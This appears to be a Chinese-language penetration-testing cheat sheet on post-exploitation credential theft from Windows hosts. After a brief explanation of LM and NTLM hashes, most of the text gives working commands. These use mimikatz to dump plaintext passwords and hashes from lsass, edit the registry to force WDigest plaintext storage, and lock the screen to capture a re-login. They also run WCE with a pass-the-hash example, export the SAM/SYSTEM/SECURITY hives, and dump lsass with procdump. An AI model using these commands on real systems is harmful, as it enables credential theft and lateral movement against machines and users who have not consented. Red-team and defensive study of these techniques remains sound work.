---
title: 【后渗透】本机密码和散列值获取
---
## 本机密码和散列值获取
## LM Hash和NTML Hash

Windows操作系统中的密码由两部分加密组成，即`LM Hash`和`NTML Hash`。

LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用`0`补全。

自`Server 2003`之后，Windows的认证方式均为NTML Hash。

自`Server 2008`开始默认禁用`LM Hash`， 当密码超过14位时候会采用NTLM加密

如果抓取的`LM Hash`为 `AAD3B435B51404EEAAD3B435B51404EE`，说明密码为空或`LM Hash`被禁用。

|      | 2003 | win7 | 2008 | 2012 |
| :--- | :--- | :--- | :--- | :--- |
| LM   | √    |      |      |      |
| NTLM | √    | √    | √    | √    |

 前面三个，当密码超过14位时候会采用NTLM加密。

**Hash一般存储在两个地方**

> **SAM文件**：存储在本机，对应本地用户
>
> **NTDS.DIT文件**：存储在域控上，对应域用户

## 获取凭证的快捷路径

翻数据库配置文件找数据库密码

翻用户桌面，可能存在服务器密码信息，甚至其它服务器

找内部wiki手册，邮箱等东西可能存在服务器IP和密码信息

## Server 2012 抓明文密码

**Server 08 及之前的版本可以直接抓明文密码**

将mimikatz上传到目标主机（需要免杀），并且要SYSTEM权限。

```bash
#读取散列值和明文密码
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" exit #123
```

 **Server 2012 抓取明文密码：**

> 手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录+导出Hash+本地mimikatz抓明文

```bash
#修改注册表来让Wdigest Auth保存明文口令
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

#恢复
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

强制锁屏

```bash
rundll32.exe user32.dll,LockWorkStation
```

## WCE抓明文密码

 **WCE**会被杀软干掉

```bash
#抓系统管理员明文密码
wce.exe -w

#抓hash，列出登录的会话和NTLM凭据
wce.exe -l

#重点，在无法破解目标hash明文的情况下可用hash注入
wce.exe -s 目标用户名:目标域名或IP:LM-HASH:NT-HASHwce.exe -s Administrator:192.168.2.130:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634
```

> hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程`lsass.exe`中去
>
> 使得本地在使用`ipc`登录目标机器的时候就如同自己登录自己的机器一样获得权限
>
> 需要支持受限管理员模式，Server 2012-r2后默认支持受限管理员模式

## Sharpdump+ mimikatz本地读取

需要.NET 3.5版本框架

下载地址：https://github.com/GhostPack/SharpDump 

Dump 的文件默认是 bin 后缀，拖到本地机器把 bin 重命名为 zip，然后解压徂徕再丢给 mimikatz

```bash
mimikatz.exe “sekurlsa::minidump debug45” “sekurlsa::logonPasswords full” “exit”
```

## 注册表 + mimikatz本地读取

**（1）导出SAM和System文件**

 Win2000和XP需要先提到`SYSTEM`，03开始直接可以reg save

```bash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
```

**（2）mimikatz本地读取 NTML Hash**

> mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；
>
> 还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。

```bash
#将导出的文件和mimikatz放到同一目录
mimikatz.exe lsadump::sam /sam:sam.hive /system:system.hive /security:security.hive
```

## Procdump + mimikatz本地读取

**（1） Procdump dump lsass（管理员权限下运行 ）**

```bash
#32位系统
procdump.exe -accepteula -ma lsass.exe lsass.dmp

#64位系统
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

**（2）mimikatz本地读取hash**

```bash
#放到同一目录
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```
